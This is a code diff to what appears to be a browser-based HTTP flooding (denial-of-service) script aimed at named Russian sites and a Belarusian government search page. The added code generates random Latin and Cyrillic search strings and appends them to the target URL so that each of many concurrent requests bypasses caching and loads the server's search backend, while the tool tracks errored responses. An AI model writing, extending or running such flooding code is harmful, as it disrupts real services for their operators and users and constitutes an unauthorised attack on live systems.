@@ -360,6 +360,14 @@
             'https://cfmc.ru',
             'https://rttv.com/'
         ];
+        
+        // urls that we want to add a search term to
+        var urlsSpecial = [
+            'https://bisr.gov.by/search/page?keys=',
+        ]
+        
+        // combine our normal and special urls
+        urls = [...urls, ...urlsSpecial]
 
         // initialize variables
         var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
@@ -401,7 +409,18 @@
 
         async function sleep(ms) {
             return new Promise(r => setTimeout(r, ms));
-        }         
+        }
+        
+        function makeRandomString() {
+            const length = Math.random() * (32 - 1) + 1;
+            let result           = '';
+            const characters     = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ ';
+            const charactersLength = characters.length;
+            for (var i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * charactersLength));
+            }
+            return result;
+        }
 
         async function flood(n) {
             const url = urls[n];
@@ -411,8 +430,16 @@
                 if (queue.length > CONCURRENCY_LIMIT) {
                     await queue.shift();
                 }
+                
+                let url$ = url;
+
+                if (urlsSpecial.indexOf(url) >= 0) {
+                    const v = makeRandomString();
+                    url$ = `${url$}${v}`;
+                }
+                
                 queue.push(
-                    fetchWithTimeout(url, { timeout: 2000 })
+                    fetchWithTimeout(url$, { timeout: 2000 })
                         .catch((error) => {
                             if (error.code === 20 /* ABORT */) {
                                 return;
